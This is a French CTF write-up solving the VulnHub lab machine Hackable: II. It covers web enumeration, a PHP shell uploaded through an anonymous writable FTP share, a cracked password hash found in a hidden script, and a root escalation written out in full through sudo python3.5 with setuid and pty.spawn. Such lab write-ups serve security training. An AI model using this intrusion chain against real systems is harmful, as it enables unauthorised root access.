---
title: "Solution du CTF Hackable 2 de VulnHub"
tags: [CTF, VulnHub]
---

[Hackable: II](https://vulnhub.com/entry/hackable-ii,711/) est un CTF très simple créé par *Elias Sousa* et téléchargeable sur *VulnHub*.

On remarque avec Nmap la présence d'un serveur web et d'un FTP. J'attaque sur le premier avec une énumération, car le serveur web ne livre que la page par défaut.

```console
$ feroxbuster -u http://192.168.56.182/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n -f

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.182/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       16l       59w      937c http://192.168.56.182/files/
403        9l       28w      279c http://192.168.56.182/icons/
403        9l       28w      279c http://192.168.56.182/server-status/
200      374l      962w    11239c http://192.168.56.182/
[####################] - 14s    62260/62260   0s      found:4       errors:3      
[####################] - 13s    62260/62260   4454/s  http://192.168.56.182/
```

Dans le dossier `files` on trouve un fichier nommé `CALL.html` mais il n'a rien d'intéressant.

Quand on se connecte sur le FTP en anonyme, on trouve dans le dossier courant le même fichier `CALL.html`. Le dossier est writable donc on peut y déposer un shell PHP puis l'appeler depuis le serveur web.

Une fois un shell récupéré, et en fouillant un peu, je trouve un fichier caché à la racine du système (l'habitude de mettre un alias pour `ls` correspondant à `ls -alh --color`) :

```console
www-data@ubuntu:/$ ls
total 100K
drwxr-xr-x  23 root  root  4.0K Nov 26  2020 .
drwxr-xr-x  23 root  root  4.0K Nov 26  2020 ..
-rwxr-xr-x   1 shrek shrek 1.2K Nov 26  2020 .runme.sh
drwxr-xr-x   2 root  root  4.0K Nov 26  2020 bin
drwxr-xr-x   3 root  root  4.0K Nov 26  2020 boot
```

Le script en question contient un hash à la fin :

```bash
#!/bin/bash
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'restarting computer in 3 seconds...'
sleep 1
echo 'restarting computer in 2 seconds...'
sleep 1
echo 'restarting computer in 1 seconds...'
sleep 1
echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:cf4c2232354952690368f1b3dfdfb24d'
```

Le hash correspond au mot de passe clair `onion`. Une fois connecté sur le compte `shrek` je peux exploiter la permission sudo :

```console
www-data@ubuntu:/$ su shrek
Password: 
shrek@ubuntu:/$ sudo -l
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
shrek@ubuntu:/$ sudo /usr/bin/python3.5
Python 3.5.2 (default, Oct  7 2020, 17:19:02) 
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.setgid(0)
>>> import pty
>>> pty.spawn("/bin/bash")
root@ubuntu:/# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
                            ____
        ____....----''''````    |.
,'''````            ____....----; '.
| __....----''''````         .-.`'. '.
|.-.                .....    | |   '. '.
`| |        ..:::::::::::::::| |   .-;. |
 | |`'-;-::::::::::::::::::::| |,,.| |-='
 | |   | ::::::::::::::::::::| |   | |
 | |   | :::::::::::::::;;;;;| |   | |
 | |   | :::::::::;;;2KY2KY2Y| |   | |
 | |   | :::::;;Y2KY2KY2KY2KY| |   | |
 | |   | :::;Y2Y2KY2KY2KY2KY2| |   | |
 | |   | :;Y2KY2KY2KY2KY2K+++| |   | |
 | |   | |;2KY2KY2KY2++++++++| |   | |
 | |   | | ;++++++++++++++++;| |   | |
 | |   | |  ;++++++++++++++;.| |   | |
 | |   | |   :++++++++++++:  | |   | |
 | |   | |    .:++++++++;.   | |   | |
 | |   | |       .:;+:..     | |   | |
 | |   | |         ;;        | |   | |
 | |   | |      .,:+;:,.     | |   | |
 | |   | |    .::::;+::::,   | |   | |
 | |   | |   ::::::;;::::::. | |   | |
 | |   | |  :::::::+;:::::::.| |   | |
 | |   | | ::::::::;;::::::::| |   | |
 | |   | |:::::::::+:::::::::| |   | |
 | |   | |:::::::::+:::::::::| |   | |
 | |   | ::::::::;+++;:::::::| |   | |
 | |   | :::::::;+++++;::::::| |   | |
 | |   | ::::::;+++++++;:::::| |   | |
 | |   |.:::::;+++++++++;::::| |   | |
 | | ,`':::::;+++++++++++;:::| |'"-| |-..
 | |'   ::::;+++++++++++++;::| |   '-' ,|
 | |    ::::;++++++++++++++;:| |     .' |
,;-'_   `-._===++++++++++_.-'| |   .'  .'
|    ````'''----....___-'    '-' .'  .'
'---....____           ````'''--;  ,'
            ````''''----....____|.'

invite-me: https://www.linkedin.com/in/eliastouguinho/
```


